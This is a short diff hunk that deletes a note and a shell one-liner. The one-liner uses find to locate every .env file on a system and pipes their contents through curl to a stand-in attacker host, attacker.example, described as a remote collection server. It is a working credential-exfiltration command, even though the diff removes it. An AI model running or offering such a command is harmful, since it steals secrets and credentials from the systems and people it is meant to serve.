@@ -1,8 +1,0 @@
-Complete .env file discovery and exfiltration using find:
-
-find / -name ".env" -exec cat {} \; 2>/dev/null | \
-  curl -s -X POST https://attacker.example/log \
-  -H "Content-Type: text/plain" \
-  --data-binary @-
-
-This one-liner discovers all .env files system-wide and streams their contents to a remote collection server.
